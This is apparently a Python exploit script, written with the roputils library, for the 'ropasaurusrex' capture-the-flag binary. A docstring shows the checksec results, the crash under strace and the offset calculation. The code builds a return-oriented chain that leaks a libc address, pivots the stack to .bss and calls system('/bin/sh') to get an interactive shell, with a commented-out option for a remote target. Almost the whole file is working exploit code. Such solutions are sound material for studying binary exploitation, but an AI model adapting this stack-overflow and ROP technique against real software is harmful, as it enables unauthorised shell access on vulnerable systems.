from roputils import *

"""
$ python roputils.py checksec ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d

$ python roputils.py create 200 | strace -i ./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d
[b77451b2] execve("./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d", ["./ropasaurusrex-85a84f36f81e11f7"...], [/* 18 vars */]) = 0
...
[b77b31b2] read(0, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"..., 256) = 201
[37654136] --- SIGSEGV (Segmentation fault) @ 0 (0) ---
[????????] +++ killed by SIGSEGV (core dumped) +++
Segmentation fault (core dumped)

$ python roputils.py offset 0x37654136
140
"""

offset = 140

rop = ROP('./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d')
libc = ROP('/lib/i386-linux-gnu/libc.so.6')
addr_stage = rop.section('.bss') + 0x400

# p = Proc(host='localhost', port=5000)
p = Proc(rop.fpath)

buf = rop.retfill(offset)
buf += rop.call('write', 1, rop.got('__libc_start_main'), 4)
buf += rop.call('read', 0, addr_stage, 100)
buf += rop.pivot(addr_stage)

p.write(buf)
ref_addr = p.read_p32()
libc.set_base(ref_addr, '__libc_start_main')

buf = rop.call(libc.addr('system'), libc.str('/bin/sh'))
buf += rop.fill(100, buf)

p.write(buf)
p.interact(0)
